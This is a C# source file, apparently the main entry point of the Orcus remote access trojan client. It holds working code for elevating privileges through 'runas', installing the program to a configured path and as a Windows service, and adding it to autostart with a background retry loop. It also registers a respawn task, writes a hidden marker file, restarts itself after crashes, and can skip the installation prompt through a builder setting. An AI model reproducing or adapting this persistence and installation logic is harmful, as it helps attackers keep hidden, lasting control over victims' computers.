using System;
using System.Diagnostics;
using System.Linq;
using System.Threading;
using System.Windows.Forms;
using Orcus.Config;
using Orcus.Protection;
using Orcus.Shared.Settings;
#if DEBUG
using Orcus.Connection;
using System.ComponentModel;
using Orcus.StaticCommandManagement;

#else
using Orcus.Plugins;
using Orcus.Service;
using Orcus.Utilities;
using System.Globalization;
using System.IO;
using Orcus.Core;

#endif

#if LOGCONSOLE
using System.Runtime.InteropServices;
#endif

namespace Orcus
{
    internal static class Program
    {
        public const int Version = 19;
        public const int AdministrationApiVersion = 2;
        public const int ServerApiVersion = 5;

        public static Mutex Mutex;

#if !DEBUG
        public static OrcusApplicationContext AppContext { get; private set; }
#endif

#if DEBUG
        public static AsyncOperation AsyncOperation;
#endif

#if LOGCONSOLE && !DEBUG
        [DllImport("kernel32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        internal static extern bool AllocConsole();
#endif

        /// <summary>
        ///     The main entry point for the application.
        /// </summary>
        [STAThread]
        private static void Main(string[] args)
        {
#if LOGCONSOLE
            AllocConsole();
            Console.SetOut(new ConsolePrefixWriter());
#endif
            if (args == null) //idiot reflection developers
                args = Environment.GetCommandLineArgs().Skip(1).ToArray();

            if (args.Contains("/wait"))
                Thread.Sleep(1000);

            Program.WriteLine("Application is starting...");

            for (int i = 0; i < 10; i++)
            {
                try
                {
                    Mutex = new Mutex(true, Settings.GetBuilderProperty<MutexBuilderProperty>().Mutex);

                    if (Mutex.WaitOne(TimeSpan.Zero, true))
                        break;
                }
                catch (Exception)
                {
                    // ignored
                }

                if (i == 9)
                    return;

                Thread.Sleep(500);
            }

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            Program.WriteLine("Mutex is registered");

            try
            {
#if DEBUG
                if (Settings.GetBuilderProperty<WatchdogBuilderProperty>().IsEnabled)
                    Watchdog.Initizalize();

                var client = new Client();
                client.BeginConnect();
                StaticCommandSelector.Initialize(client);

                Application.Run(new MainForm(client));
#else
                // Set the unhandled exception mode to force all Windows Forms errors
                // to go through our handler.
                Application.SetUnhandledExceptionMode(UnhandledExceptionMode.CatchException);

                // Add the event handler for handling non-UI thread exceptions to the event.
                AppDomain.CurrentDomain.UnhandledException +=
                    (sender, e) =>
                    {
                        var exception = e.ExceptionObject as Exception;
                        if (exception != null)
                            ErrorReporter.Current.ReportError(exception, "UnhandledException");

                        Application.Restart();
                    };

                Application.ThreadException += (sender, eventArgs) =>
                {
                    ErrorReporter.Current.ReportError(eventArgs.Exception, "ThreadException");
                    Application.Restart();
                };

                Thread.CurrentThread.CurrentCulture = new CultureInfo("en-US"); //For english exceptions

                PluginLoader.Current.LoadPlugins(Settings.ClientConfig.PluginResources);

                var assemblyPath = Consts.ApplicationPath;
                var isInstalled = string.Equals(assemblyPath,
                    Environment.ExpandEnvironmentVariables(Settings.GetBuilderProperty<InstallationLocationBuilderProperty>().Path),
                    StringComparison.OrdinalIgnoreCase);

                foreach (var clientPlugin in PluginLoader.Current.ClientPlugins)
                {
                    try
                    {
                        if (!clientPlugin.InfluenceStartup(ClientOperator.Instance))
                            return;
                    }
                    catch (Exception ex)
                    {
                        ErrorReporter.Current.ReportError(ex,
                            "InfluenceStartup() at plugin: \"" + clientPlugin.GetType() + "\"");
                    }
                }

                Program.WriteLine($"isInstalled = {isInstalled}; InstallBuilderProperty.Install = {Settings.GetBuilderProperty<InstallBuilderProperty>().Install}");

                if ((!isInstalled || args.Contains("/forceInstall")) && Settings.GetBuilderProperty<InstallBuilderProperty>().Install)
                {
                    Program.WriteLine("Enter installation process");
                    if (!Settings.GetBuilderProperty<DisableInstallationPromptBuilderProperty>().IsDisabled && !args.Contains("/update"))
                    {
                        var orcusInstalledFile =
                            new FileInfo(
                                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                                    ".orcusInstallation"));
                        if (!orcusInstalledFile.Exists || !File.ReadAllLines(orcusInstalledFile.FullName).Contains(Settings.Mutex))
                        {
                            if (new InstallationPromptForm().ShowDialog() != DialogResult.OK)
                                return;

                            using (var fileStream = new FileStream(orcusInstalledFile.FullName, FileMode.Append, FileAccess.Write))
                            using (var streamWriter = new StreamWriter(fileStream))
                                streamWriter.WriteLine(Settings.Mutex);

                            File.SetAttributes(orcusInstalledFile.FullName, FileAttributes.Hidden);
                        }
                    }

                    Program.WriteLine("Is administrator = " + User.IsAdministrator);

                    if (!User.IsAdministrator && Settings.GetBuilderProperty<RequireAdministratorPrivilegesInstallerBuilderProperty>().RequireAdministratorPrivileges)
                    {
                        var exeName = Process.GetCurrentProcess().MainModule.FileName;
                        var startInfo = new ProcessStartInfo(exeName) {Verb = "runas", Arguments = "/wait"};
                        try
                        {
                            Process.Start(startInfo);
                        }
                        catch (Exception)
                        {
                            // ignored
                        }
                        return;
                    }

                    Program.WriteLine($"ServiceBuilderProperty.Install = {Settings.GetBuilderProperty<ServiceBuilderProperty>().Install}");
                    if (Settings.GetBuilderProperty<ServiceBuilderProperty>().Install)
                        ServiceInstaller.InstallIfNotExist();

                    FileInfo fileInfo;
                    if (Installer.Install(Environment.ExpandEnvironmentVariables(Settings.GetBuilderProperty<InstallationLocationBuilderProperty>().Path),
                        assemblyPath, out fileInfo))
                    {
                        foreach (var clientPlugin in PluginLoader.Current.Loadables)
                        {
                            try
                            {
                                clientPlugin.Install(fileInfo.FullName);
                            }
                            catch (Exception ex)
                            {
                                ErrorReporter.Current.ReportError(ex, "Install plugin: \"" + clientPlugin.GetType() + "\"");
                            }
                        }
                        Process.Start(fileInfo.FullName);
                    }
                    return;
                }

                if (Settings.GetBuilderProperty<InstallBuilderProperty>().Install &&
                    Settings.GetBuilderProperty<AutostartBuilderProperty>().AutostartMethod != StartupMethod.Disable)
                {
                    var result = false;
                    try
                    {
                        result = Autostarter.AddToAutostart(Consts.ApplicationPath);
                    }
                    catch (Exception)
                    {
                        //ignore
                    }
                    if (!result)
                        new Thread(() =>
                        {
                            while (true)
                            {
                                Thread.Sleep(1000*60*5); //5 min
                                if (Autostarter.AddToAutostart(Consts.ApplicationPath))
                                    return;
                            }
                        }) {IsBackground = true}.Start();
                }

                var respawnTaskProperty = Settings.GetBuilderProperty<RespawnTaskBuilderProperty>();
                if (respawnTaskProperty.IsEnabled)
                    RespawnTask.RegisterRespawnTask(assemblyPath, respawnTaskProperty.TaskName);

                if (Settings.GetBuilderProperty<ServiceBuilderProperty>().Install) //we always look if our service could be installed
                    ServiceInstaller.InstallIfNotExist();

                AppContext = new OrcusApplicationContext();
                Application.Run(AppContext);
#endif
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }

        public static void Unload()
        {
#if !DEBUG
            AppContext.Unload();
#endif
            if (Watchdog.IsEnabled)
                Watchdog.Close();
        }

        public static void Exit()
        {
#if !DEBUG
            AppContext.Unload();
            AppContext.ExitThread();
#endif
            if (Watchdog.IsEnabled)
                Watchdog.Close();
            Environment.Exit(0);
        }

        [Conditional("LOGCONSOLE")]
        public static void WriteLine(string message)
        {
            Console.WriteLine(message);
        }
    }
}